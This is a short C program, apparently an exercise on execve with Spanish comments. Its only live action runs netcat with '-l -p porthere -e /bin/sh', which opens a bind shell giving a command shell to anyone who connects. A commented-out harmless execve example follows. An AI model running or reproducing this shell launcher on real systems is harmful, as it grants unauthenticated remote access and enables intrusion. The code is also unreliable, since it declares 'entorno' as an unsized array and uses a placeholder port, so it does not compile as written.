#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>
#include <stdlib.h>


int main(int argc, char const *argv[])
{
    char * const entorno[];
    char * const command[] = {"nc", "-l", "-p", "porthere", "-e", "/bin/sh", NULL};
    execve("/usr/bin/nc", command, entorno);

    //char *newargv[] = { "suma.exe", "5", "4"};
    //char *newenviron[] = { "HOME=/root", NULL }; 


    //El primer parametro de argv (arvg[0] es el nombre del ejecutable)
    //execve("./suma.exe", newargv, NULL);
    
        
    return 0;
}
